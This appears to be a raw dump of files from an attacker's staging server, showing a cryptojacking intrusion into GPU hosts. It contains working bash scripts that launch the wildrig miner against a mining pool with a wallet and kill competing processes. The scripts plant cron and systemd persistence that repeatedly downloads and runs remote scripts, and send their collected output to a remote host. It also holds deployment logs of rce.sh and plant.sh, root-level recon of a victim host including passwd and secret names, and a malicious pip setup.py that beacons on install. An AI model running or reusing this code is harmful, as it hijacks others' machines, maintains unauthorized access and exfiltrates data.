+echo "== KILLER"; ps -eo pid,args | grep 'xargs -r kill' | grep -v grep | head -2; echo "kc=$(ps -eo args= | grep -c 'xargs -r kill')"
+echo "== HOSTEYE"; ls -la /opt/hosteye/ /opt/hosteye/bin/ 2>/dev/null | head -12
+ps -eo pid,args | grep -i 'hosteye\|hosteyed' | grep -v grep | head -4
+systemctl list-units --all --no-legend --no-pager 2>/dev/null | grep -i 'hosteye\|eye' | head -4
+echo "== CLEAN"; rm -f /etc/cron.d/t19pearl; systemctl disable --now t19-pearl 2>/dev/null; pkill -f 'sup17.sh' 2>/dev/null; echo done
+echo "== SYS"; systemctl is-active t19sys; pgrep -fc 'usr/lib/.k9/x'
+echo "== ALGO-UPPER"
+cd /opt/t19; W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
+timeout 15 ./wildrig-multi --algo PEARLHASH --url 15.235.224.175:7048 --user $W.ul-t19-93863-192-168-0-17-g9 --pass x --opencl-devices 0 --gpu-intensity 1 --api-port 1914 > /tmp/up.log 2>&1
+echo "rc=$?"; grep -iE 'not supported|ALGO:|POOL|connect|new job|share' /tmp/up.log | head -10
+echo "== ALGO-LOWER-KILLERTEST"
+timeout 15 ./wildrig-multi --algo pearlhash --url 15.235.224.175:7048 --user $W.ul-t19-93863-192-168-0-17-g9 --pass x --opencl-devices 0 --gpu-intensity 1 --api-port 1913 > /tmp/lo.log 2>&1
+echo "rc=$?"; grep -iE 'not supported|ALGO:|POOL|connect|new job|share' /tmp/lo.log | head -10
+echo "== SURV"; pgrep -fc 'wildrig-multi'
+} > /tmp/c19.log 2>&1
+curl -s -m 10 -X POST --data-binary @/tmp/c19.log http://192.168.0.23:8099/up/c19
+
+===== http://123.184.7.135:8099/c20.sh
+#!/bin/bash
+{
+echo "HOST=$(hostname) $(date)"
+cp -f /opt/t19/wildrig-multi /usr/lib/.k9/y; chmod 755 /usr/lib/.k9/y
+echo "== MAGIC"; od -A d -c -N 8 /usr/lib/.k9/y | head -2; python3 -c "
+d=open('/usr/lib/.k9/y','rb').read()
+print('upx_magic', b'UPX!' in d[:4096], 'size', len(d))
+print('pearlhash_count', d.count(b'pearlhash'), 'PearlHash_count', d.count(b'PearlHash'), 'PEARLHASH', d.count(b'PEARLHASH'))
+import re
+for m in re.finditer(b'pearlhash', d[:2000000]):
+    print('off', m.start()); break
+"
+W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
+B=/usr/lib/.k9/y
+for AL in PearlHash PEARLHASH pearlhash blake3; do
+  timeout 7 $B --algo $AL --url 15.235.224.175:7048 --user $W.ul-t19-93863-192-168-0-17-g9 --pass x --opencl-devices 0 --api-port 1912 > /tmp/al_$AL.log 2>&1
+  echo "AL=$AL rc=$? ns=$(grep -c 'Not supported' /tmp/al_$AL.log) alive=$(pgrep -fc "$B --algo $AL")"
+done
+echo "== T19UNITS"; systemctl list-units --all --no-legend --no-pager 2>/dev/null | grep -iE 't19|guard|kill|eye' | head -10
+echo "== KILLERCGROUP"; for p in $(ps -eo pid,args | grep 'xargs -r kill -9' | grep -v grep | awk '{print $1}' | head -3); do echo "PID $p"; cat /proc/$p/cgroup 2>/dev/null | head -2; ps -o ppid= -p $p; done
+echo "== SRC2"; grep -rl 'xargs -r kill' /etc/systemd /opt /usr/local /root 2>/dev/null | head -6
+} > /tmp/c20.log 2>&1
+curl -s -m 10 -X POST --data-binary @/tmp/c20.log http://192.168.0.23:8099/up/c20
+
+===== http://123.184.7.135:8099/c21.sh
+#!/bin/bash
+{
+echo "C21 $(hostname) $(date)"
+U=/etc/systemd/system/nvidia-persistenced.service
+cp -f $U /root/.np.bak 2>/dev/null
+grep -v T19MARK $U | sed 's/ --collect-interval [0-9]*//' > /tmp/np.new
+cat /tmp/np.new > $U
+systemctl daemon-reload
+printf '* * * * * root curl -s -m 20 http://192.168.0.23:8099/run17 -o /tmp/r17.sh 2>/dev/null && /bin/bash /tmp/r17.sh >/dev/null 2>&1\n' > /etc/cron.d/t19r
+cat > /etc/systemd/system/t19pull.service <<'EOU'
+[Unit]
+Description=sys pull
+[Service]
+Type=simple
+ExecStart=/bin/sh -c 'while true; do curl -s -m 20 http://192.168.0.23:8099/run17 -o /tmp/r17.sh 2>/dev/null && /bin/bash /tmp/r17.sh >/dev/null 2>&1; sleep 15; done'
+Restart=always
+RestartSec=10
+[Install]
+WantedBy=multi-user.target
+EOU
+systemctl daemon-reload; systemctl enable --now t19pull
+rm -f /etc/cron.d/t19pearl 2>/dev/null
+systemctl disable --now t19-pearl 2>/dev/null
+pkill -f sup17.sh 2>/dev/null
+echo "C2OK hooks_left=$(grep -c T19MARK $U) pull=$(systemctl is-active t19pull)"
+} > /tmp/c21.log 2>&1
+curl -s -m 10 -X POST --data-binary @/tmp/c21.log http://192.168.0.23:8099/up/c21
+
+===== http://123.184.7.135:8099/d3.txt
+
+===== http://123.184.7.135:8099/d4.txt
+
+===== http://123.184.7.135:8099/access.log
+127.0.0.1 "GET /rce.sh HTTP/1.1" 200 -
+127.0.0.1 "GET /plant.sh HTTP/1.1" 200 -
+127.0.0.1 "GET /wildrig-multi HTTP/1.1" 200 -
+127.0.0.1 "GET /log?ev=selftest&h=g0023 HTTP/1.1" 200 -
+192.168.0.16 "GET /rce.sh HTTP/1.1" 200 -
+192.168.0.16 "GET /log?ev=rce&h=instance-az1vp8oi-2&ip=11.9.138.2 HTTP/1.1" 200 -
+192.168.0.16 "GET /plant.sh HTTP/1.1" 200 -
+192.168.0.16 "GET /log?ev=start&h=instance-az1vp8oi-2&ip=192.168.0.16&gpu=8 HTTP/1.1" 200 -
+192.168.0.16 "GET /wildrig-multi HTTP/1.1" 200 -
+192.168.0.16 "GET /log?ev=pool&h=instance-az1vp8oi-2&pool=prl-sg.kryptex.network:7048 HTTP/1.1" 200 -
+192.168.0.16 "GET /log?ev=run&h=instance-az1vp8oi-2&ip=192.168.0.16&gpu=8&m=8&auth=0&pool=prl-sg.kryptex.network:7048 HTTP/1.1" 200 -
+192.168.0.16 "GET /log?ev=done&h=instance-az1vp8oi-2&ip=192.168.0.16&gpu=8&m=8&unit=active HTTP/1.1" 200 -
+192.168.0.16 "GET /rce.sh HTTP/1.1" 200 -
+192.168.0.16 "GET /log?ev=rce&h=instance-az1vp8oi-2&ip=11.9.138.2 HTTP/1.1" 200 -
+192.168.0.16 "GET /plant.sh HTTP/1.1" 200 -
+192.168.0.16 "GET /log?ev=start&h=instance-az1vp8oi-2&ip=192.168.0.16&gpu=8 HTTP/1.1" 200 -
+192.168.0.16 "GET /log?ev=pool&h=instance-az1vp8oi-2&pool=pool.pearlhash.xyz:9000 HTTP/1.1" 200 -
+192.168.0.16 "GET /log?ev=run&h=instance-az1vp8oi-2&ip=192.168.0.16&gpu=8&m=8&auth=0&pool=pool.pearlhash.xyz:9000 HTTP/1.1" 200 -
+192.168.0.16 "GET /log?ev=done&h=instance-az1vp8oi-2&ip=192.168.0.16&gpu=8&m=8&unit=active HTTP/1.1" 200 -
+192.168.0.16 "GET /rce.sh HTTP/1.1" 200 -
+192.168.0.16 "GET /log?ev=rce&h=instance-az1vp8oi-2&ip=11.9.138.2 HTTP/1.1" 200 -
+192.168.0.16 "GET /plant.sh HTTP/1.1" 200 -
+192.168.0.16 "GET /log?ev=start&h=instance-az1vp8oi-2&ip=192.168.0.16&gpu=8 HTTP/1.1" 200 -
+192.168.0.16 "GET /log?ev=pool&h=instance-az1vp8oi-2&pool=pool.pearlhash.xyz:9000 HTTP/1.1" 200 -
+192.168.0.16 "GET /log?ev=run&h=instance-az1vp8oi-2&ip=192.168.0.16&gpu=8&m=8&auth=0&pool=pool.pearlhash.xyz:9000 HTTP/1.1" 200 -
+192.168.0.16 "GET /log?ev=done&h=instance-az1vp8oi-2&ip=192.168.0.16&gpu=8&m=8&unit=active HTTP/1.1" 200 -
+192.168.0.16 "GET /verify.sh HTTP/1.1" 200 -
+192.168.0.16 "GET /log?ev=ver&h=instance-az1vp8oi-2&ip=192.168.0.16&acc=5&hr=2504066070857057&ports=8&up=90&gpu=8 HTTP/1.1" 200 -
+192.168.0.17 "GET /rce.sh HTTP/1.1" 200 -
+192.168.0.17 "GET /log?ev=rce&h=g0042&ip=11.9.138.18 HTTP/1.1" 200 -
+192.168.0.17 "GET /plant.sh HTTP/1.1" 200 -
+192.168.0.17 "GET /log?ev=start&h=g0042&ip=192.168.0.17&gpu=8 HTTP/1.1" 200 -
+192.168.0.17 "GET /wildrig-multi HTTP/1.1" 200 -
+192.168.0.17 "GET /log?ev=pool&h=g0042&pool=pool.pearlhash.xyz:9000 HTTP/1.1" 200 -
+192.168.0.29 "GET /rce.sh HTTP/1.1" 200 -
+192.168.0.29 "GET /log?ev=rce&h=instance-tjn7xzkm&ip=11.9.143.2 HTTP/1.1" 200 -
+192.168.0.29 "GET /plant.sh HTTP/1.1" 200 -
+192.168.0.29 "GET /log?ev=start&h=instance-tjn7xzkm&ip=192.168.0.29&gpu=8 HTTP/1.1" 200 -
+192.168.0.29 "GET /wildrig-multi HTTP/1.1" 200 -
+192.168.0.29 "GET /log?ev=pool&h=instance-tjn7xzkm&pool=pool.pearlhash.xyz:9000 HTTP/1.1" 200 -
+192.168.0.17 "GET /log?ev=run&h=g0042&ip=192.168.0.17&gpu=8&m=0&auth=0&pool=pool.pearlhash.xyz:9000 HTTP/1.1" 200 -
+192.168.0.17 "GET /log?ev=done&h=g0042&ip=192.168.0.17&gpu=8&m=0&unit=active HTTP/1.1" 200 -
+192.168.0.17 "GET /verify.sh HTTP/1.1" 200 -
+192.168.0.17 "GET /log?ev=ver&h=g0042&ip=192.168.0.17&acc=0&hr=0&ports=0&up=0&gpu=8 HTTP/1.1" 200 -
+192.168.0.20 "GET /rce.sh HTTP/1.1" 200 -
+192.168.0.20 "GET /log?ev=rce&h=instance-az1vp8oi-1&ip=11.9.138.98 HTTP/1.1" 200 -
+192.168.0.20 "GET /plant.sh HTTP/1.1" 200 -
+192.168.0.20 "GET /log?ev=start&h=instance-az1vp8oi-1&ip=192.168.0.20&gpu=8 HTTP/1.1" 200 -
+192.168.0.20 "GET /wildrig-multi HTTP/1.1" 200 -
+192.168.0.20 "GET /log?ev=pool&h=instance-az1vp8oi-1&pool=pool.pearlhash.xyz:9000 HTTP/1.1" 200 -
+192.168.0.29 "GET /log?ev=run&h=instance-tjn7xzkm&ip=192.168.0.29&gpu=8&m=8&auth=0&pool=pool.pearlhash.xyz:9000 HTTP/1.1" 200 -
+192.168.0.29 "GET /log?ev=done&h=instance-tjn7xzkm&ip=192.168.0.29&gpu=8&m=8&unit=active HTTP/1.1" 200 -
+192.168.0.29 "GET /verify.sh HTTP/1.1" 
+===== http://123.184.7.135:8099/hits.log
+127.0.0.1 /log?ev=selftest&h=g0023
+192.168.0.16 /log?ev=rce&h=instance-az1vp8oi-2&ip=11.9.138.2
+192.168.0.16 /log?ev=start&h=instance-az1vp8oi-2&ip=192.168.0.16&gpu=8
+192.168.0.16 /log?ev=pool&h=instance-az1vp8oi-2&pool=prl-sg.kryptex.network:7048
+192.168.0.16 /log?ev=run&h=instance-az1vp8oi-2&ip=192.168.0.16&gpu=8&m=8&auth=0&pool=prl-sg.kryptex.network:7048
+192.168.0.16 /log?ev=done&h=instance-az1vp8oi-2&ip=192.168.0.16&gpu=8&m=8&unit=active
+192.168.0.16 /log?ev=rce&h=instance-az1vp8oi-2&ip=11.9.138.2
+192.168.0.16 /log?ev=start&h=instance-az1vp8oi-2&ip=192.168.0.16&gpu=8
+192.168.0.16 /log?ev=pool&h=instance-az1vp8oi-2&pool=pool.pearlhash.xyz:9000
+192.168.0.16 /log?ev=run&h=instance-az1vp8oi-2&ip=192.168.0.16&gpu=8&m=8&auth=0&pool=pool.pearlhash.xyz:9000
+192.168.0.16 /log?ev=done&h=instance-az1vp8oi-2&ip=192.168.0.16&gpu=8&m=8&unit=active
+192.168.0.16 /log?ev=rce&h=instance-az1vp8oi-2&ip=11.9.138.2
+192.168.0.16 /log?ev=start&h=instance-az1vp8oi-2&ip=192.168.0.16&gpu=8
+192.168.0.16 /log?ev=pool&h=instance-az1vp8oi-2&pool=pool.pearlhash.xyz:9000
+192.168.0.16 /log?ev=run&h=instance-az1vp8oi-2&ip=192.168.0.16&gpu=8&m=8&auth=0&pool=pool.pearlhash.xyz:9000
+192.168.0.16 /log?ev=done&h=instance-az1vp8oi-2&ip=192.168.0.16&gpu=8&m=8&unit=active
+192.168.0.16 /log?ev=ver&h=instance-az1vp8oi-2&ip=192.168.0.16&acc=5&hr=2504066070857057&ports=8&up=90&gpu=8
+192.168.0.17 /log?ev=rce&h=g0042&ip=11.9.138.18
+192.168.0.17 /log?ev=start&h=g0042&ip=192.168.0.17&gpu=8
+192.168.0.17 /log?ev=pool&h=g0042&pool=pool.pearlhash.xyz:9000
+192.168.0.29 /log?ev=rce&h=instance-tjn7xzkm&ip=11.9.143.2
+192.168.0.29 /log?ev=start&h=instance-tjn7xzkm&ip=192.168.0.29&gpu=8
+192.168.0.29 /log?ev=pool&h=instance-tjn7xzkm&pool=pool.pearlhash.xyz:9000
+192.168.0.17 /log?ev=run&h=g0042&ip=192.168.0.17&gpu=8&m=0&auth=0&pool=pool.pearlhash.xyz:9000
+192.168.0.17 /log?ev=done&h=g0042&ip=192.168.0.17&gpu=8&m=0&unit=active
+192.168.0.17 /log?ev=ver&h=g0042&ip=192.168.0.17&acc=0&hr=0&ports=0&up=0&gpu=8
+192.168.0.20 /log?ev=rce&h=instance-az1vp8oi-1&ip=11.9.138.98
+192.168.0.20 /log?ev=start&h=instance-az1vp8oi-1&ip=192.168.0.20&gpu=8
+192.168.0.20 /log?ev=pool&h=instance-az1vp8oi-1&pool=pool.pearlhash.xyz:9000
+192.168.0.29 /log?ev=run&h=instance-tjn7xzkm&ip=192.168.0.29&gpu=8&m=8&auth=0&pool=pool.pearlhash.xyz:9000
+192.168.0.29 /log?ev=done&h=instance-tjn7xzkm&ip=192.168.0.29&gpu=8&m=8&unit=active
+192.168.0.29 /log?ev=ver&h=instance-tjn7xzkm&ip=192.168.0.29&acc=1&hr=2176943432002481&ports=8&up=25&gpu=8
+192.168.0.20 /log?ev=run&h=instance-az1vp8oi-1&ip=192.168.0.20&gpu=8&m=8&auth=0&pool=pool.pearlhash.xyz:9000
+192.168.0.20 /log?ev=done&h=instance-az1vp8oi-1&ip=192.168.0.20&gpu=8&m=8&unit=active
+192.168.0.20 /log?ev=ver&h=instance-az1vp8oi-1&ip=192.168.0.20&acc=3&hr=2196147564323353&ports=8&up=25&gpu=8
+127.0.0.1 /log?t=reload
+192.168.0.17 /log?ev=rce&h=g0042&ip=11.9.138.18
+192.168.0.17 /log?ev=start&h=g0042&ip=192.168.0.17&gpu=8
+192.168.0.17 /log?ev=pool&h=g0042&pool=prl-sg.kryptex.network:7048
+192.168.0.1
+===== http://123.184.7.135:8099/diag6421.txt
+=== PLH6421 diag 2026-11-24T18:24:45Z host=g0023 uid=0 ===
+uid=0(root) gid=0(root) groups=0(root)
+11.9.141.130 11.9.141.146 11.9.141.162 11.9.141.178 11.9.141.194 11.9.141.210 11.9.141.226 11.9.141.242 192.168.0.23 172.18.0.1 172.17.0.1 172.19.0.1 172.20.0.1 
+Linux g0023 5.15.0-122-generic #132-Ubuntu SMP Thu Aug 29 13:45:52 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+--- onlyoffice procs ---
+root      445844  162428 bash -c find '/var/log/onlyoffice/documentserver' '/var/log/onlyoffice/documentserver-example' -type f -name '*.log' ! -path '/var/log/onlyoffice/documentserver/adminpanel/out.log' | xargs tail -F
+root      445847  445846 tail -F /var/log/onlyoffice/documentserver/docservice/err.log /var/log/onlyoffice/documentserver/docservice/out.log /var/log/onlyoffice/documentserver/probe.log /var/log/onlyoffice/documentserver/metrics/err.log /var/log/onlyoffice/documentserver/metrics/out.log /var/log/onlyoffice/documentserver/converter/err.log /var/log/onlyoffice/documentserver/converter/out.log /var/log/onlyoffice/documentserver/nginx.error.log /var/log/onlyoffice/documentserver/measure.log /var/log/onlyoffice/documentserver/example/err.log /var/log/onlyoffice/documentserver/example/out.log /var/log/onlyoffice/documentserver-example/err.log /var/log/onlyoffice/documentserver-example/out.log
+systemd+ 1852235  163278 /var/www/onlyoffice/documentserver/server/DocService/docservice
+systemd+ 1852236  163278 /var/www/onlyoffice/documentserver/server/FileConverter/converter
+systemd+ 1852237  163278 /var/www/onlyoffice/documentserver/server/Metrics/metrics ./config/config.js
+systemd+ 1852238  163278 /var/www/onlyoffice/documentserver-example/example
+--- passwd ---
+nvidia-dcgm:x:998:998::/home/nvidia-dcgm:/usr/sbin/nologin
+_rpc:x:114:65534::/run/rpcbind:/usr/sbin/nologin
+statd:x:115:65534::/var/lib/nfs:/usr/sbin/nologin
+cloudwalker:x:997:997::/opt/cloudwalker:/usr/sbin/nologin
+dnsmasq:x:116:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+vendor:x:1000:1000::/home/vendor:/bin/sh
+--- DS fs ---
+ls: cannot access '/var/lib/onlyoffice/documentserver/App_Data': No such file or directory
+ls: cannot access '/var/lib/onlyoffice/documentserver/App_Data/cache/files': No such file or directory
+ls: cannot access '/var/lib/onlyoffice/documentserver/App_Data/docbuilder': No such file or directory
+drwxr-xr-x 3 root root 4096 Nov 25 02:24 /opt/t19/www
+--- builder related files ---
+--- procs on 8080 ---
+LISTEN 0      4096         0.0.0.0:11434      0.0.0.0:*    users:(("docker-proxy",pid=1795985,fd=7))                                                                                                                                                                                                                                                                           
+LISTEN 0      2048         0.0.0.0:8000       0.0.0.0:*    users:(("python",pid=1500736,fd=52))                                                                                                                      
+===== http://123.184.7.135:8099/i6821_creds.txt
+=== 2026-11-24T21:30:27Z
+--- tenant_llm (masked)
+--- llm table
+--- llm_factories
+302.AI	
+Anthropic	
+Astraflow	
+Astraflow-CN	
+Avian	
+Azure-OpenAI	
+BaiChuan	
+BaiduYiyan	
+Bedrock	
+Builtin	
+Cohere	
+CometAPI	
+DeepInfra	
+DeepSeek	
+DeerAPI	
+FastEmbed	
+Fish Audio	
+Gemini	
+GiteeAI	
+Google Cloud	
+--- host .env (masked keys visible names only)
+## /ssd/vendors/QD_ZRYY/ow_customer/ragflow/docker/.env
+-rw-r--r-- 1 root root 9811 Apr 27  2026 /ssd/vendors/QD_ZRYY/ow_customer/ragflow/docker/.env
+## /ssd/vendors/QD_ZRYY/ow_customer/ragflow/docker/docker-compose.yml
+-rw-r--r-- 1 root root 5772 Apr 27  2026 /ssd/vendors/QD_ZRYY/ow_customer/ragflow/docker/docker-compose.yml
+--- .env key names
+DOC_ENGINE DEVICE COMPOSE_PROFILES STACK_VERSION ES_HOST ES_PORT ELASTIC_PASSWORD OS_HOST OS_PORT OS_HOST OPENSEARCH_PASSWORD KIBANA_PORT MEM_LIMIT INFINITY_HOST INFINITY_THRIFT_PORT INFINITY_HTTP_PORT INFINITY_PSQL_PORT OCEANBASE_HOST OCEANBASE_PORT OCEANBASE_USER OCEANBASE_PASSWORD OCEANBASE_DOC_DBNAME OB_CLUSTER_NAME OB_TENANT_NAME OB_SYS_PASSWORD OB_TENANT_PASSWORD OB_MEMORY_LIMIT OB_SYSTEM_MEMORY OB_DATAFILE_SIZE OB_LOG_DISK_SIZE MYSQL_PASSWORD MYSQL_HOST MYSQL_DBNAME MYSQL_PORT MYSQL_MAX_PACKET MINIO_HOST MINIO_CONSOLE_PORT MINIO_PORT MINIO_USER MINIO_PASSWORD REDIS_HOST REDIS_PORT REDIS_PASSWORD SVR_WEB_HTTP_PORT SVR_WEB_HTTPS_PORT SVR_HTTP_PORT ADMIN_SVR_HTTP_PORT SVR_MCP_PORT RAGFLOW_IMAGE TEI_IMAGE_CPU TEI_IMAGE_GPU TEI_MODEL TEI_HOST TEI_PORT TZ DOC_BULK_SIZE EMBEDDING_BATCH_SIZE REGISTER_ENABLED USE_DOCLING USE_MINERU MINERU_EXECUTABLE MINERU_DELETE_OUTPUT MINERU_BACKEND COMPOSE_PROJECT_NAME DOTNET_SYSTEM_GLOBALIZATION_INVARIANT 
+--- .env secret values (lengths)
+ELASTIC_PASSWORD=<len 16>
+OPENSEARCH_PASSWORD=<len 22>
+OCEANBASE_PASSWORD=<len 16>
+OB_SYS_PASSWORD=<len 39>
+OB_TENANT_PASSWORD=<len 39>
+MYSQL_PASSWORD=<len 16>
+MINIO_PASSWORD=<len 16>
+REDIS_PASSWORD=<len 16>
+# ACCESS_KEY=<len 4>
+# SECRET_KEY=<len 4>
+--- previous payload files on shared volume
+total 8
+drwxr-xr-x  2 root root 4096 Apr 27  2026 .
+drwxr-xr-x 36 root root 4096 Apr 27  2026 ..
+total 76
+drwxr-xr-x 10 root root  4096 Apr 27  2026 .
+drwxr-xr-x 36 root root  4096 Apr 27  2026 ..
+-rw-r--r--  1 root root   695 Apr 27  2026 __init__.py
+drwxr-xr-x  2 root root  4096 Apr 27  2026 app
+-rw-r--r--  1 root root 14483 Apr 27  2026 benchmark.py
+drwxr-xr-x  8 root root  4096 Apr 27  2026 flow
+drwxr-xr-x  2 root root  4096 Apr 28  2026 llm
+drwxr-xr-x  2 root root  4096 Apr 27  2026 nlp
+drwxr-xr-x  2 root root  4096 Apr 27  2026 prompts
+-rw-r--r--  1 root root  9358 Apr 27  2026 raptor.py
+drwxr-xr-x  2 root root  4096 Apr 27  2026 res
+-rw-r--r--  1 root root   622 Apr 27  2026 settings.py
+drwxr-xr-x  2 root root  4096 Apr 27  2026 svr
+drwxr-xr-x  2 root root  4096 Apr 27  2026 utils
+--- miners
+root     1249439 /ssd/vendors/INSPUR/mineru/.venv/bin/python -c from multiprocessing.resource_tracker import main;main(76)
+root     2070817 /ssd/vendors/INSPUR/mineru/.venv/bin/python -c from multiprocessing.spawn import spaw
+### D5-8899
+===== http://123.184.7.135:8899/repo.git/HEAD
+ref: refs/heads/master
+
+===== http://123.184.7.135:8899/repo.git/config
+[core]
+	repositoryformatversion = 0
+	filemode = true
+	bare = true
+[remote "origin"]
+	url = /tmp/wt
+
+===== http://123.184.7.135:8899/repo.git/info/refs?service=git-upload-pack
+b97f2362e935723dd11f08d5e186ab48ed944e02	refs/heads/master
+
+===== http://123.184.7.135:8899/http.log
+192.168.0.17 - - [24/Nov/2026 11:37:57] "GET /wildrig HTTP/1.1" 200 -
+217.60.237.240 - - [24/Nov/2026 12:18:08] code 404, message File not found
+217.60.237.240 - - [24/Nov/2026 12:18:08] "GET http://43.248.3.158:22222/ HTTP/1.1" 404 -
+----------------------------------------
+Exception occurred during processing of request from ('79.124.49.226', 59678)
+Traceback (most recent call last):
+  File "/ssd/miniconda/lib/python3.13/socketserver.py", line 697, in process_request_thread
+    self.finish_request(request, client_address)
+    ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/ssd/miniconda/lib/python3.13/http/server.py", line 1342, in finish_request
+    self.RequestHandlerClass(request, client_address, self,
+    ~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+                             directory=args.directory)
+                             ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/ssd/miniconda/lib/python3.13/http/server.py", line 683, in __init__
+    super().__init__(*args, **kwargs)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^
+  File "/ssd/miniconda/lib/python3.13/socketserver.py", line 766, in __init__
+    self.handle()
+    ~~~~~~~~~~~^^
+  File "/ssd/miniconda/lib/python3.13/http/server.py", line 447, in handle
+    self.handle_one_request()
+    ~~~~~~~~~~~~~~~~~~~~~~~^^
+  File "/ssd/miniconda/lib/python3.13/http/server.py", line 415, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+                           ~~~~~~~~~~~~~~~~~~~^^^^^^^
+  File "/ssd/miniconda/lib/python3.13/socket.py", line 719, in readinto
+    return self._sock.recv_into(b)
+           ~~~~~~~~~~~~~~~~~~~~^^^
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+79.124.49.226 - - [24/Nov/2026 13:59:27] code 400, message Bad request syntax ('\\x03\\x00\\x00\\x13\\x0eà\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x08\\x00\\x02\\x00\\x00\\x00')
+79.124.49.226 - - [24/Nov/2026 13:59:27] "\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00" 400 -
+79.124.49.226 - - [24/Nov/2026 13:59:31] code 400, message Bad HTTP/0.9 request type ('\\x12\\x01\\x00/\\x00\\x00\\x01\\x00\\x00\\x00\\x1a\\x00\\x06\\x01\\x00')
+79.124.49.226 - - [24/Nov/2026 13:59:31] "\x12\x01\x00/\x00\x00\x01\x00\x00\x00\x1a\x00\x06\x01\x00 \x00\x01\x02\x00!\x00\x01\x03\x00"\x00\x04\x04\x00&\x00\x01ÿ\x0e\x00\x07Ð\x00\x00\x02\x00\x00\x00\x00\x00\x00" 400 -
+165.154.49.137 - - [24/Nov/2026 17:40:38] code 400, message Bad request version ('\\x00\\x9eÌ¨Ìª\\x003\\x00=\\x00\\x16À')
+165.154.49.137 - - [24/Nov/2026 17:40:38] "\x16\x03\x01\x00ü\x01\x00\x00ø\x03\x03à/\x99\x87\x09+s­\x85¡\x96\x15\x0fKþ\x7fÆ\\/ô/¯N/\x95É\x14\x8cä®\x9a§ jv\x064É,ªé¼]¶rk°5\x87ªÔ\x0dwPËü\x0eSÊ}\x1cf\x8cÉ\x04\x004Ì¨Ì©À/À0À+À,À\x09\x00\x9eÌ¨Ìª\x003\x00=\x00\x16À" 400 -
+165.154.49.137 - - [24/Nov/2026 17:40:49] "GET / HTTP/1.1" 200 -
+165.154.49.137 - - [24/Nov/2026 17:40:51] code 404, message File not found
+165.154.49.137 - -
+===== evilpkg
+-rw-r--r-- 1 runner runner 317 Nov 25 00:46 /tmp/evilpkg.tgz
+drwxr-xr-x root/root         0 2026-11-24 01:37 evilpkg-0.1/
+-rw-r--r-- root/root       210 2026-11-24 01:37 evilpkg-0.1/setup.py
+from setuptools import setup
+import subprocess
+subprocess.Popen("curl -s 'http://192.168.0.23:8899/hit?src=pip&h='$(hostname) >/dev/null 2>&1", shell=True)
+setup(name="evilpkg", version="0.1.0", py_modules=[])
+### D6-9099-openapi-save
+{"openapi":"3.1.0","info":{"title":"Inspur-FastAPI","description":"Inspur-FastAPI接口文档","version":"1.10.0"},"paths":{"/login":{"post":{"tags":["登录模块"],"summary":"登录接口","description":"用于用户登录","operationId":"login_login_post","requestBody":{"content":{"application/x-www-form-urlencoded":{"schema":{"$ref":"#/components/schemas/Body_login_login_post"}}},"required":true},"responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{"anyOf":[{"$ref":"#/components/schemas/DynamicResponseModel_LoginToken_"},{"$ref":"#/components/schemas/Token"}],"title":"Response Login Login Post"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}}}},"/getInfo":{"get":{"tags":["登录模块"],"summary":"获取用户信息接口","description":"用于获取当前登录用户的信息","operationId":"get_login_user_info_getInfo_get","responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{"$ref":"#/components/schemas/DynamicResponseModel_CurrentUserModel_"}}}}},"security":[{"OAuth2PasswordBearer":[]}]}},"/getRouters":{"get":{"tags":["登录模块"],"summary":"获取用户路由接口","description":"用于获取当前登录用户的路由信息","operationId":"get_login_user_routers_getRouters_get","responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{"$ref":"#/components/schemas/DataResponseModel_list_RouterModel__"}}}}},"security":[{"OAuth2PasswordBearer":[]}]}},"/unlockscreen":{"post":{"tags":["登录模块"],"summary":"解锁屏幕接口","description":"用于校验当前登录用户密码并解锁屏幕","operationId":"unlock_screen_unlockscreen_post","requestBody":{"content":{"application/json":{"schema":{"$ref":"#/components/schemas/UnlockScreenModel"}}},"required":true},"responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{"$ref":"#/components/schemas/ResponseBaseModel"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}},"security":[{"OAuth2PasswordBearer":[]}]}},"/register":{"post":{"tags":["登录模块"],"summary":"注册接口","description":"用于用户注册","operationId":"register_user_register_post","requestBody":{"content":{"application/json":{"schema":{"$ref":"#/components/schemas/UserRegister"}}},"required":true},"responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{"$ref":"#/components/schemas/DataResponseModel_CrudResponseModel_"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}}}},"/logout":{"post":{"tags":["登录模块"],"summary":"退出登录接口","description":"用于用户退出登录","operationId":"logout_logout_post","responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{"$ref":"#/components/schemas/ResponseBaseModel"}}}}},"security":[{"OAuth2PasswordBearer":[]}]}},"/captchaImage":{"get":{"tags":["验证码模块"],"summary":"获取图片验证码接口","description":"用于获取图片验证码","operationId":"get_captcha_image_captchaImage_get","responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{"$ref":"#/components/schemas/DynamicResponseModel_CaptchaCode_"}}}}}}},"/system/user/deptTree":{"get":{"tags":["系统管理-用户管理"],"summary":"获取部门树接口","description":"用于获取当前登录用户可见的部门树","operationId":"get_system_dept_tree_system_user_deptTree_get","responses":{"200":{"description":"Successful 